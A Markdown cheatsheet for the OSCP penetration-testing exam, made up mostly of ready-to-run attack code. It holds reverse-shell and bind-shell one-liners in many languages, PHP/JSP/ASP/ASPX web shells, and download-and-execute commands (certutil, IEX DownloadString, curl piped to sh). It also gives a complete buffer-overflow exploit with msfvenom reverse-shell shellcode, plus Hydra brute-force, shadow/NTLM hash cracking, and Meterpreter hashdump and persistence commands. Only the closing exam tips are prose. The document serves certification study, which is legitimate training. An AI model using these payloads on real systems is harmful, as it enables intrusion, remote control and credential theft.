# Exploitation Techniques Cheatsheet for OSCP

## Reverse Shells

### Bash
```bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'
```

### Python
```python
# Python 2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Perl
```perl
perl -e 'use Socket;$i="10.10.10.10";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### PHP
```php
php -r '$sock=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.10.10.10",4444);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.10.10.10",4444);system("/bin/sh -i <&3 >&3 2>&3");'
```

### Ruby
```ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.10.10","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### Netcat
```bash
nc -e /bin/sh 10.10.10.10 4444
nc -c /bin/sh 10.10.10.10 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f
```

### PowerShell
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### Java
```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.10.10/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## Bind Shells

### Netcat
```bash
nc -lvp 4444 -e /bin/sh
```

### Python
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",4444));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### PHP
```php
php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",4444);socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'
```

## Web Shells

### PHP
```php
<?php system($_GET['cmd']); ?>
<?php exec($_GET['cmd']); ?>
<?php shell_exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
```

### JSP
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

### ASP
```asp
<% Set rs = CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")) 
o = rs.StdOut.Readall() 
Response.write(o) %>
```

### ASPX
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e)
{
    if (Request.QueryString["cmd"] != null)
    {
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + Request.QueryString["cmd"];
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.Start();
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
        p.Close();
    }
}
</script>
```

## File Transfer Techniques

### Linux

#### Using Netcat
```bash
# Receiver
nc -lvp 4444 > file.txt

# Sender
nc 10.10.10.10 4444 < file.txt
```

#### Using Python HTTP Server
```bash
# Sender
python -m SimpleHTTPServer 8000
python3 -m http.server 8000

# Receiver
wget http://10.10.10.10:8000/file.txt
curl http://10.10.10.10:8000/file.txt -o file.txt
```

#### Using SCP
```bash
# Upload
scp file.txt user@10.10.10.10:/path/to/destination

# Download
scp user@10.10.10.10:/path/to/file.txt .
```

#### Using Base64
```bash
# Sender
cat file.txt | base64 -w 0

# Receiver (paste the base64 output)
echo "base64_string" | base64 -d > file.txt
```

### Windows

#### Using PowerShell
```powershell
# Download file
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.10.10:8000/file.exe', 'C:\Windows\Temp\file.exe')"
powershell -c "Invoke-WebRequest -Uri 'http://10.10.10.10:8000/file.exe' -OutFile 'C:\Windows\Temp\file.exe'"

# Upload file (requires Python HTTP server with PUT enabled)
powershell -c "(New-Object System.Net.WebClient).UploadFile('http://10.10.10.10:8000/upload', 'C:\Windows\Temp\file.exe')"
```

#### Using Certutil
```cmd
certutil -urlcache -split -f "http://10.10.10.10:8000/file.exe" file.exe
```

#### Using BITS
```powershell
bitsadmin /transfer mydownloadjob /download /priority normal http://10.10.10.10:8000/file.exe C:\Windows\Temp\file.exe
```

#### Using SMB
```bash
# On Kali, set up SMB server
impacket-smbserver share /path/to/share

# On Windows
copy \\10.10.10.10\share\file.exe C:\Windows\Temp\file.exe
```

## Buffer Overflow Methodology

### 1. Fuzzing
```python
#!/usr/bin/python
import socket, sys

buffer = "A" * 100
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('10.10.10.10', 9999))
        s.send(buffer)
        s.close()
        buffer = buffer + "A" * 100
        print("Fuzzing with %s bytes" % len(buffer))
    except:
        print("Fuzzing crashed at %s bytes" % len(buffer))
        sys.exit()
```

### 2. Finding the Offset
```bash
# Generate pattern
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000

# Find offset after crash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39694438
```

### 3. Controlling EIP
```python
#!/usr/bin/python
import socket

buffer = "A" * 2288    # Offset
buffer += "B" * 4      # EIP
buffer += "C" * 500    # ESP / Shellcode space

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.10.10.10', 9999))
s.send(buffer)
s.close()
```

### 4. Finding Bad Characters
```python
#!/usr/bin/python
import socket

# All possible characters
badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

buffer = "A" * 2288    # Offset
buffer += "B" * 4      # EIP
buffer += badchars     # Testing for bad chars

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.10.10.10', 9999))
s.send(buffer)
s.close()
```

### 5. Finding a JMP ESP Instruction
```bash
# In Immunity Debugger
!mona modules
!mona find -s "\xff\xe4" -m module.dll
```

### 6. Generating Shellcode
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f python -b "\x00\x0a\x0d" -v shellcode
```

### 7. Final Exploit
```python
#!/usr/bin/python
import socket
import struct

# Shellcode (msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f python -b "\x00\x0a\x0d")
shellcode = (
"\xb8\x8a\x24\xa5\x57\xda\xd8\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
"\x52\x31\x42\x12\x83\xea\xfc\x03\x1a\x93\xd1\x95\x66\x43\x97"
"\x56\x96\x94\xf8\xdf\x73\xa5\x38\xbb\xf0\x96\x88\xcf\x54\x1b"
"\x62\x9d\x4c\xa8\x06\x0a\x63\x19\xac\x6c\x4a\x9a\x9d\x4d\xcd"
"\x18\xdc\x81\x2d\x20\x2f\xd4\x2c\x65\x52\x15\x7c\x3e\x18\x88"
"\x90\x4b\x54\x11\x1b\x07\x78\x11\xf8\xd0\x7b\x30\xaf\x6b\x22"
"\x92\x4e\xbf\x5e\x9b\x48\xdc\x5b\x55\xe3\x16\x17\x64\x25\x67"
"\xd8\xcb\x08\x47\x2b\x15\x4d\x60\xd4\x60\xa7\x92\x69\x73\x7c"
"\xe8\xb5\xf6\x66\x4a\x3d\xa0\x42\x6a\x92\x37\x01\x60\x5f\x33"
"\x4d\x65\x5e\x90\xe6\x91\xeb\x17\x28\x10\xaf\x33\xec\x78\x6b"
"\x5d\xb5\x24\xda\x62\xa5\x86\x83\xc6\xae\x2b\xd7\x7a\xed\x23"
"\x14\xb7\x0d\xb4\x32\xc0\x7e\x86\x9d\x7a\xe8\xaa\x56\xa5\xef"
"\xcd\x4c\x11\x7f\x30\x6f\x62\x56\xf7\x3b\x32\xc0\xde\x43\xd9"
"\x10\xde\x91\x4e\x40\x70\x4a\x2f\x30\x30\x3a\xc7\x5a\xbf\x65"
"\xf7\x65\x15\x0e\x92\x9c\xfe\xf1\xcb\x9c\x12\x9a\xc9\x9c\x15"
"\x07\x47\x7a\x7f\x67\x01\xd5\x17\x1e\x08\xad\x86\xdf\x86\xc8"
"\x89\x54\x25\x2d\x47\x9d\x40\x3d\x30\x6d\x1f\x1f\x97\x72\xb5"
"\x37\x7b\xe0\x52\xc7\xf2\x19\xcd\x90\x53\xef\x04\x74\x4e\x56"
"\xbf\x6a\x93\x0e\xf8\x2e\x48\xf3\x07\xaf\x1d\x4f\x2c\xbf\xdb"
"\x50\x68\xeb\xb3\x06\x26\x45\x72\xf1\x88\x3f\x2c\xae\x42\xd7"
"\xa9\x9c\x54\xa1\xb5\xc8\x22\x4d\x07\xa5\x72\x72\xa8\x21\x73"
"\x0b\xd4\xd1\x7c\xc6\x5c\xf1\x9e\xc2\x69\x9a\x06\x97\xd3\xc7"
"\xb8\x42\x17\xfe\x3a\x66\xe8\x05\x22\x03\xed\x42\xe4\xf8\x9f"
"\xdb\x81\xfe\x0c\xdb\x83"
)

buffer = "A" * 2288                          # Offset
buffer += struct.pack("<L", 0x625011AF)      # JMP ESP address in little-endian
buffer += "\x90" * 16                        # NOP sled
buffer += shellcode                          # Shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.10.10.10', 9999))
s.send(buffer)
s.close()

print("Exploit sent!")
```

## Password Attacks

### Hydra

#### SSH Brute Force
```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10
```

#### Web Form Brute Force
```bash
# POST request
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"

# GET request
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-get-form "/login.php:username=^USER^&password=^PASS^:Login failed"
```

#### FTP Brute Force
```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.10
```

#### SMB Brute Force
```bash
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt smb://10.10.10.10
```

### John the Ripper

#### Hash Cracking
```bash
# Linux shadow file
unshadow /etc/passwd /etc/shadow > hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Windows NTLM hashes
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# MD5 hashes
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# SHA1 hashes
john --format=raw-sha1 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

#### SSH Key Cracking
```bash
python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

#### ZIP File Cracking
```bash
zip2john file.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
```

### Hashcat

#### Hash Cracking
```bash
# MD5
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# SHA1
hashcat -m 100 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Windows NTLM
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Linux /etc/shadow (SHA512)
hashcat -m 1800 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# WPA/WPA2
hashcat -m 16800 -a 0 capture.hccapx /usr/share/wordlists/rockyou.txt
```

#### Rule-Based Attack
```bash
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

#### Brute Force Attack
```bash
hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a
```

#### Combination Attack
```bash
hashcat -m 0 -a 1 hashes.txt wordlist1.txt wordlist2.txt
```

## Metasploit Framework (Limited Usage in OSCP)

### Basic Usage
```bash
# Start Metasploit
msfconsole

# Search for exploits
search type:exploit platform:windows ms17-010

# Use an exploit
use exploit/windows/smb/ms17_010_eternalblue

# Set options
show options
set RHOSTS 10.10.10.10
set LHOST 10.10.10.11
set LPORT 4444

# Run the exploit
exploit
```

### Meterpreter Commands
```
# System commands
sysinfo
getuid
getprivs
ps
migrate PID

# File system commands
pwd
ls
cd
download file
upload file
cat file

# Network commands
ipconfig
route
portfwd add -l 3389 -p 3389 -r target

# Privilege escalation
getsystem
hashdump
load kiwi
creds_all

# Persistence
run persistence -h
run persistence -X -i 5 -p 4444 -r 10.10.10.11
```

### OSCP Restrictions
Remember that in the OSCP exam, Metasploit usage is restricted:
- You can use Metasploit only on ONE machine
- Multi-handler can be used without restrictions
- Meterpreter cannot be used for post-exploitation on other machines
- Manual exploitation is required for most machines

## Privilege Escalation

### Linux Privilege Escalation

#### Enumeration Scripts
```bash
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh

# Linux Smart Enumeration
./lse.sh -l 1 -i
```

#### Common Vectors
```bash
# SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Writable files
find / -writable -type f 2>/dev/null

# Sudo rights
sudo -l

# Cron jobs
cat /etc/crontab
ls -la /etc/cron*

# Kernel exploits
uname -a
```

### Windows Privilege Escalation

#### Enumeration Scripts
```powershell
# PowerUp
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8000/PowerUp.ps1'); Invoke-AllChecks"

# JAWS
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8000/jaws-enum.ps1')"

# WinPEAS
.\winPEASany.exe
```

#### Common Vectors
```powershell
# Service Misconfigurations
sc qc vulnerable-service
icacls "C:\Program Files\Vulnerable Service\service.exe"

# Unquoted Service Paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Stored Credentials
cmdkey /list
```

## OSCP Exam Tips

1. **Methodology is Key**: Follow a structured approach for each machine
   - Enumeration
   - Vulnerability identification
   - Exploitation
   - Post-exploitation
   - Privilege escalation
   - Documentation

2. **Take Good Notes**: Document every step for your report
   - Commands used
   - Output of commands
   - Screenshots of key findings
   - Exploitation process

3. **Time Management**: Don't spend too much time on one machine
   - If stuck, move on to another machine
   - Come back with fresh eyes later

4. **Avoid Rabbit Holes**: Not everything is exploitable
   - Focus on services with known vulnerabilities
   - Prioritize based on potential impact

5. **Manual Exploitation**: Practice manual exploitation techniques
   - Understand the underlying vulnerability
   - Be able to modify exploits as needed

6. **Backup Plans**: Have multiple approaches ready
   - Different exploit methods
   - Different privilege escalation techniques
   - Alternative tools

7. **Stay Calm**: The exam is designed to be challenging
   - Take breaks when needed
   - Revisit your methodology when stuck

8. **Report Writing**: Start your report as you go
   - Document each step
   - Take clear screenshots
   - Explain your methodology
